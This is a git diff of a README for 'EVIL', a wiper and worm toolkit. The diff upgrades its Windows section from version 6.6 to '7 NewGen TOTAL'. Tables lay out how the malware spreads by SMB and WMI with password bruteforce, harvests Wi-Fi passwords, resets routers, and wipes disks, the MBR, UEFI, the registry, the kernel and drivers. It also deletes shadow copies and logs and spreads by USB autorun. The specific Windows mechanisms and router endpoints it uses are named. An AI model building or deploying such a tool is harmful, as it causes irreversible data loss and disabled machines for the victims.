@@ -10,77 +10,74 @@ EVIL 2.5 - cross-platform collection of scripts for complete and irreversible de
 ## Platform Capabilities
 
 ### Windows 
-# EVIL 6.6 NewGen 
+## What Is EVIL 7 NewGen TOTAL
 
-## What This Script Does
+EVIL 7 NewGen TOTAL is the final, complete, no-compromise version of the EVIL series for Windows. It combines:
+
+- **Network worm** — spreads across local network via SMB/Admin$ + WMI
+- **Total wiper** — DoD + Gutmann 26-pass disk wiping + clean all
+- **Router killer** — reboot/reset/SPI corrupt on supported devices
+- **USB destroyer** — kills USB ports via registry + driver deletion + PnP disable
+- **UEFI / ESP / MBR annihilation** — makes system unbootable
+- **Registry + kernel + driver deletion** — Windows cannot start
+- **Self-deletion + forced shutdown**
+
+**This is the maximum software destruction possible on Windows.**
+
+---
+
+## Full Feature List (77+ functions)
 
 | # | Feature | Details |
 |---|---------|---------|
-| 1 | **Wi-Fi Passwords Harvest** | Extracts all saved Wi-Fi passwords (русский/english fallback) |
-| 2 | **Router Attack** | Reboot + factory reset + firmware kill (5+ methods) |
-| 3 | **Full Disk Wipe (DoD 7-pass)** | Writes 7 patterns (0x00,0xFF,0x00,0xFF,0x00,0xFF,0xAA) to every sector |
-| 4 | **clean all via diskpart** | Complete drive sanitization (all partitions removed) |
-| 5 | **BitLocker Bypass** | Manage-bde -off on C:/D:/E: drives |
-| 6 | **ESP Partition Destruction** | Mounts and wipes EFI System Partition even without drive letter |
-| 7 | **UEFI Variables Destruction** | BootOrder, Boot0000-0005, BootCurrent, SecureBoot, PK, KEK, db, dbx — all wiped |
-| 8 | **Windows Kernel Deletion** | ntoskrnl.exe, winload.exe, winload.efi, hal.dll — deleted via PendingFileRenameOperations |
-| 9 | **50+ Critical Drivers Disabled** | disk, partmgr, storahci, stornvme, pci, acpi, ntfs, USBSTOR, USBHUB3, TCPIP, NDIS, and more |
-| 10 | **Physical Driver File Deletion** | All *.sys in C:\Windows\System32\drivers — queued for deletion |
-| 11 | **Registry Hive Destruction** | SYSTEM, SOFTWARE, SAM, SECURITY, DEFAULT — overwritten with 10MB of zeros |
-| 12 | **Registry Classes Deletion** | HKLM\SOFTWARE\Classes — removed |
-| 13 | **All Services Disabled** | HKLM\SYSTEM\CurrentControlSet\Services — Start=4 for every service |
-| 14 | **All AppX Packages Removed** | Remove-AppxPackage -AllUsers |
-| 15 | **System Files Queue for Deletion** | *.mui, *.dll, *.exe, Fonts, Media, Themes — all via PendingFileRenameOperations |
-| 16 | **Network Adapters Disabled** | All adapters (except Loopback) — Disable-NetAdapter |
-| 17 | **Wi-Fi Profiles Deleted** | netsh wlan delete profile * |
-| 18 | **Routing Table Flushed** | route -f |
-| 19 | **IP Stack Reset** | netsh int ip reset all |
-| 20 | **Firewall Total Block** | blockinbound,blockoutbound + all rules disabled |
-| 21 | **DNS Client Disabled** | sc config Dnscache start= disabled + sc stop |
-| 22 | **USB Ports KILL** | USBSTOR/USBHUB3/USBXHCI disabled via registry + driver files deleted + PnP disable |
-| 23 | **USB Spread (Infection)** | Copies itself to every USB drive automatically |
-| 24 | **WinRing0 Hardware Kill** | MSR write (CPU power), PCI config kill, EC ports, SATA/AHCI, Thunderbolt, TPM |
-| 25 | **PnP Devices Disabled** | All non-critical devices (ACPI/PCI/Processor excluded) |
-| 26 | **Logical Drives Overwrite** | Raw write 200×100MB to C:/D:/E: |
-| 27 | **Network Spread** | Copies itself to all network drives (DriveType 4) |
-| 28 | **Self-Deletion** | Set-PendingDelete on script itself |
-| 29 | **Winlogon Kill + Shutdown** | Stop-Process winlogon + Stop-Computer -Force |
+| 1 | **VM detection** | Removes VMware/VirtualBox drivers |
+| 2 | **Hidden CPU load** | Fork bomb + calc.exe + WMI stress |
+| 3 | **Persistence (6 methods)** | Startup, Documents, ProgramData, schtasks, Run, RunOnce |
+| 4 | **Wi-Fi password harvest** | Extracts all saved Wi-Fi passwords (EN/RU) |
+| 5 | **Router attack** | Sends reboot/reset to common router web interfaces |
+| 6 | **Network scanning** | ICMP scan of /24 subnet |
+| 7 | **SMB spread** | Copies itself to \\IP\Admin$ using password bruteforce |
+| 8 | **WMI remote execution** | Runs copy on remote machines |
+| 9 | **Bluetooth / WWAN kill** | Disables all non-Wi-Fi wireless adapters |
+| 10 | **Logs + shadows deletion** | wevtutil + vssadmin + WMI |
+| 11 | **Kernel deletion** | ntoskrnl, winload, winresume, hal — queued |
+| 12 | **Registry total wipe** | SYSTEM, SOFTWARE, SAM, SECURITY, DEFAULT — 10MB zeros |
+| 13 | **MBR killer** | First 512 bytes of PhysicalDrive0 overwritten |
+| 14 | **Services disabled** | All non-critical services Start=4 |
+| 15 | **50+ drivers destroyed** | disk, partmgr, storahci, stornvme, pci, acpi, ntfs, tcpip, ndis, USBSTOR, USBHUB3, bthport and more |
+| 16 | **Full disk wipe (26 patterns)** | DoD 5220.22-M + Gutmann — every sector |
+| 17 | **clean all via diskpart** | Complete partition table removal |
+| 18 | **Logical drives overwrite** | 500×100MB zero writes to C:/D:/E: |
+| 19 | **Mass file deletion** | All .exe, .dll, .sys, .mui, fonts, media, themes — queued |
+| 20 | **BCD / UEFI / ESP destruction** | Boot configuration wiped, EFI partition erased, BootOrder corrupted |
+| 21 | **Network total block** | All adapters disabled, Wi-Fi profiles deleted, firewall blocks inbound+outbound |
+| 22 | **USB total kill** | USBSTOR/USBHUB3/USBXHCI disabled + drivers deleted + PnP disable |
+| 23 | **ARP table flood** | Poisoning with fake MAC entries |
+| 24 | **USB spread (AutoRun)** | Copies script to removable drives with autorun.inf |
+| 25 | **DNS spoof on router** | Attempts to change router DNS to 0.0.0.0 |
+| 26 | **Certificate deletion** | Removes all trusted certificates |
+| 27 | **WinRE destruction** | Disables recovery environment, deletes WinRE.wim |
+| 28 | **Process kill** | Taskkill on all non-system processes |
+| 29 | **Network shares deletion** | net share * /delete |
+| 30 | **Fake BSOD + memory diagnostic** | Triggers blue screen with custom message |
+| 31 | **Windows Update + BITS disabled** | No recovery through updates |
+| 32 | **Inode exhaustion** | Fills drives with 1KB files until full |
+| 33 | **Random admin password** | Changes Administrator password to random string |
+| 34 | **WinRing0 hardware attacks** | MSR write (CPU power), EC port kill (battery/controller) |
+| 35 | **ASCII skull + siren** | 666/1000/1337 Hz beeps |
+| 36 | **Self-deletion + forced shutdown** | Removes script and powers off |
 
 ---
 
-## USB Attack Details
+## Irreversible Effects
 
-| Action | Method |
-|--------|--------|
-| **Registry disable** | USBSTOR, USBHUB3, USBXHCI — Start=4 |
-| **Driver file deletion** | USBSTOR.SYS, USBHUB3.SYS, USBXHCI.SYS — queued for deletion |
-| **PnP disable** | Get-PnpDevice -Class USB | Disable-PnpDevice |
-| **USB spread** | Copies evil.ps1 to every USB drive found |
-
----
-
-## Hardware Attack (WinRing0)
-
-| Component | Action |
-|-----------|--------|
-| **CPU** | MSR write (0x1A0, 0x1B0) — disable power management, max load |
-| **PCI Configuration** | Write 0x00000000 to command register for all devices (bus 0-255, dev 0-31, func 0-7) |
-| **SATA/AHCI** | Disable storahci, msahci, pciide + driver deletion |
-| **Embedded Controller** | Write to EC ports: 0x66/0x62, 0x68/0x6C, 0x290/0x291 |
-| **TPM** | tpm.sys deletion + Start=4 |
-| **Thunderbolt** | Thunderbolt, TbtBus, TbtP2p — disabled |
-
----
-
-## Router Attack Methods
-
-| Method | Target |
-|--------|--------|
-| `/reboot` | Generic routers |
-| `/reset` | Factory reset |
-| `/userRpm/SysRebootRpm.htm` | TP-Link |
-| `/goform/reboot` | D-Link, Huawei |
-| `/rebootinfo.cgi` | Various |
+- **All data on all drives** — permanently destroyed (26-pass overwrite + clean all)
+- **Windows cannot boot** — bootloader + kernel + registry eliminated
+- **Drives may not be detected** — storage drivers destroyed
+- **Network dead** — adapters disabled, firewall locked, Wi-Fi erased
+- **USB ports dead** — USBSTOR/USBHUB3 drivers destroyed + PnP disabled
+- **Recovery impossible** — logs, shadows, WinRE, certificates deleted
+- **Router (partial)** — rebooted/reset (hardware brick on vulnerable models)
 
 ---
 
@@ -88,27 +85,24 @@ EVIL 2.5 - cross-platform collection of scripts for complete and irreversible de
 
 | Action | Method | Persistence |
 |--------|--------|-------------|
-| Disk wipe | `\\.\PhysicalDriveN` raw write (DoD 7-pass) | Permanent |
-| ESP kill | `mountvol Z: /s` + raw write + `Add-PartitionAccessPath` fallback | Permanent |
-| Kernel delete | `PendingFileRenameOperations` registry | After reboot |
-| Driver disable | `Start=4` in registry + PnP disable + `.sys` deletion | After reboot |
-| USB kill | `Start=4` + driver deletion + PnP disable | After reboot |
-| Registry kill | Zero overwrite (10MB) + `PendingFileRenameOperations` | Permanent |
-| UEFI variables | `Set-FirmwareEnvironmentVariable` (0xFF,0xFF,0xFF,0xFF) | Permanent |
-| Network | Firewall block + adapter disable + DNS kill | Permanent |
+| Disk wipe | 26 patterns × `\\.\PhysicalDriveN` raw write | Permanent |
+| Registry kill | 10MB zero overwrite | Permanent |
+| MBR kill | 512 bytes raw write | Permanent |
+| Kernel delete | `PendingFileRenameOperations` | After reboot |
+| Driver kill | Start=4 + `.sys` deletion | After reboot |
+| UEFI/ESP kill | `mountvol Z:` + raw write + BootOrder wipe | Permanent |
+| Network kill | `Disable-NetAdapter` + `netsh advfirewall block` | Permanent |
+| USB kill | Start=4 + driver deletion + `Disable-PnpDevice -Class USB` | After reboot |
+| Network spread | `Admin$` copy + WMI + `schtasks` | Remote execution |
 
 ---
 
-## Irreversible Effects
+## Requirements
 
-- **All data on all drives** — permanently lost (DoD 7-pass + clean all)
-- **Windows cannot boot** — bootloader + kernel + registry destroyed
-- **Drives may not be detected** — storage drivers disabled + driver files deleted
-- **USB ports dead** — USBSTOR/USBHUB3/USBXHCI disabled + driver files deleted
-- **UEFI/BIOS** — variables wiped, ESP destroyed
-- **Network** — adapters disabled, firewall blocks all, DNS dead
-- **Wi-Fi** — all profiles deleted
-- **Router** — rebooted/reset (hardware brick on old models)
+- **Windows 7 / 8 / 10 / 11** (x64 recommended)
+- **Administrator privileges** (script auto-elevates)
+- **PowerShell** (any version)
+- **Optional:** `WinRing0x64.dll` for hardware attacks (place next to script)
 
 
 ---
